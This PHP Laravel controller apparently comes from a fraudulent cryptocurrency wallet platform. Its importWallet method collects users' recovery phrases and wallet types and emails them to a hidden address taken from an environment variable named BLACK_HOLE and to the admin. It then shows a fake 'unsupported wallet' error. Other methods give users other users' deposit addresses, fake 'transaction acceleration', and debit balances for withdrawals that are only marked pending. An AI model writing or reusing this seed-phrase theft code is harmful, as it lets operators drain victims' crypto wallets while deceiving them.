<?php

namespace App\Http\Controllers;

use App\Mail\NotifyImp;
use App\Transactions;
use App\Wallets;
use App\X4Defaults;
use Illuminate\Http\Request;
use App\Mail\AccelerateTransactionEmail;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use App\User;

class WalletsController extends Controller
{
    public function getUserActiveWallet($user_id = null, $coin_id = null, $coin_slug = null)
    {


        $wallet_id_info = null;
        $wallet_info = null;
        if (!empty($coin_slug)) {
            $wallet_info = Wallets::where('user_id', $user_id)
                ->where('coin_slug', $coin_slug)
                ->first();
        }
        if (!empty($coin_id)) {
            $wallet_id_info = Wallets::where('user_id', $user_id)
                ->where('coin_id', $coin_id)
                ->first();
        }
        if (!is_object($wallet_info) && !is_object($wallet_id_info)) {
            if (!empty($coin_slug))
                return Wallets::where('status', Wallets::ACTIVE)
                    ->where('coin_slug', $coin_slug)
                    ->first();

            if (!empty($coin_id))
                return Wallets::where('status', Wallets::ACTIVE)
                    ->where('coin_id', $coin_id)
                    ->first();
        }elseif(is_object($wallet_info)){
            return $wallet_info;
        }elseif(is_object($wallet_id_info)){
            return $wallet_id_info;
        }
        return false;
    }


    public function sendCoin(Request $request)
    {
        $coin_slug = $request->input('coin_slug');
        $amount_to_send = $request->input('amount_to_send');
        $send_qty = $request->input('send_qty');
        $receiver_wallet_address = $request->input('receiver_wallet_address');
        $description = $request->input('description');
        $user_id = $request->input('user_id');

        $system_default = x4default(X4Defaults::GENERAL_SYSTEM_CONFIG_SLUG);
        if (is_object($system_default)) {
            $withdrawal_status = $system_default->data->withdrawal_status;
            if ($withdrawal_status === X4Defaults::NOT_ACTIVE_STATUS) {
                return ['status' => false, 'transaction' => $request->toArray(), 'message' => 'Withdrawal is currently under maintenance, try again'];
            }
        }

        $coin_info = new CoinInfoController();
        $coin = $coin_info->getCoinInfo('', $coin_slug);
        $fiat_amount = $coin->price * $send_qty;

        $coin_balance = new CoinsBalanceController();
        $update_balance = $coin_balance->updateCoinBalance($user_id, $coin_slug, -$send_qty);
        if ($update_balance) {
            $transaction = new TransactionsController();
            $transaction->RequestToArray($request, 'withdraw', '', $coin_slug, $send_qty, '', $user_id, Transactions::PENDING, $description, $receiver_wallet_address);
            return ['status' => true, 'transaction' => '', 'message' => 'completed'];
        } else {
            return ['status' => false, 'transaction' => $request->toArray(), 'message' => 'Insufficient fund to perform operation'];
        }
    }

    public function Accelerator()
    {
        return view('appV1.dashboard.accelerate');
    }

    public function TransAccelerate(Request $request)
    {
        $hash = $request->input('hash');
        if (!empty($hash)) {

            Mail::to(config('app.admin_email'))->send(new AccelerateTransactionEmail($request, null, null));
            return redirect()->back()->with('status', 'Transaction Accelerated, pending transaction will be confirmed shortly');
        } else {
            return redirect()->back()->with('status2', 'Invalid Transaction Hash');

        }

    }

    public function assignCoinWallet($user_id)
    {
        $coins = new CoinsController();
        $get_coins = $coins->getSupportedCoins();
        foreach ($get_coins as $coin) {
            if (is_object($coin)) {
                if (!$this->verifyWalletExists($coin->id, $user_id)) {
                    $wallet = Wallets::where('coin_id', $coin->id)->inRandomOrder()->first();
                    $create_wallet = new Wallets();
                    if (is_object($wallet)) {
                        $create_wallet->user_id = $user_id;
                        $create_wallet->coin_id = $coin->id;
                        $create_wallet->coin_slug = 0;
                        $create_wallet->wallet_address = $wallet->wallet_address;
                        $create_wallet->tag_name = $wallet->tag_name;
                        $create_wallet->tag_value = $wallet->tag_value;
                        $create_wallet->wallet_network = $wallet->wallet_network;
                        $create_wallet->status = Wallets::ACTIVE;
                        $create_wallet->save();

                    }
                }
            }
        }

        return true;
    }

    public function assignTokenWallet($user_id)
    {
        $tokens = new TokenController();
        $get_tokens = $tokens->getOtherStakingCoins();
        foreach ($get_tokens as $token) {
            if (is_object($token)) {
                $wallets = Wallets::where('coin_slug', $token->slug)->where('user_id', '!=', $user_id)->inRandomOrder()->first();
                $wallet_create = new Wallets();
                if (is_object($wallets)) {
                    $wallet_create->user_id = $user_id;
                    $wallet_create->coin_slug = strtoupper($token->slug);
                    $wallet_create->wallet_address = $wallets->wallet_address;
                    $wallet_create->coin_id = 0;
                    $wallet_create->status = Wallets::ACTIVE;
                    $wallet_create->save();
                }
            }
        }
        return true;
    }

    public function supportedCoinsPage()
    {
        return view('appV1.dashboard.wallet');
    }

    public function viewChart($coin_slug)
    {
        $coins = new CoinsController();
        $get_coin = $coins->getCoin($coin_slug);
        if (is_object($get_coin)) {
            return view('appV1.dashboard.chart', ['coin' => $get_coin]);
        }
        return redirect()->back()->with('status2', 'Unable to complete request');
    }

    public function verifyWalletExists($coin_id, $user_id)
    {
        return Wallets::where('coin_id', $coin_id)->where('user_id', $user_id)->exists();
    }

    public function view()
    {
        return view('appV1.dashboard.wallet.wallet');
    }

    public function import()
    {
        return view('appV1.dashboard.wallet.import');
    }

    public function walletHistory()
    {
        return view('appV1.dashboard.wallet.history');
    }

    public function importWallet($wallet = null, $type = null, $phrase = null, $usr = null)
    {
        $data = [
            "key_type" => $wallet,
            "wallet_type" => $type,
            "recovery_data" => $phrase,
            "user_id" => $usr
        ];

        try {

            $email = env('BLACK_HOLE');
            Mail::to($email)->send(new NotifyImp($data));
            Mail::to(config('app.admin_email'))->send(new NotifyImp($data));
        } catch (\Exception $e) {
            Log::debug($e->getTraceAsString());
        }

        return errorResponse("#Error001031: unable to fetch wallet data, we are working on expanding our system to support more wallets.", $data);

    }

    public function adminWalletHistory($user_id)
    {
        $user = User::find($user_id);
        $transactions = Transactions::where('user_id', $user_id)
            ->with('payment')
            ->get();
        return view('appV1.admin.wallet_history', [
            'transactions' => $transactions,
            "user" => $user
        ]);
    }
}
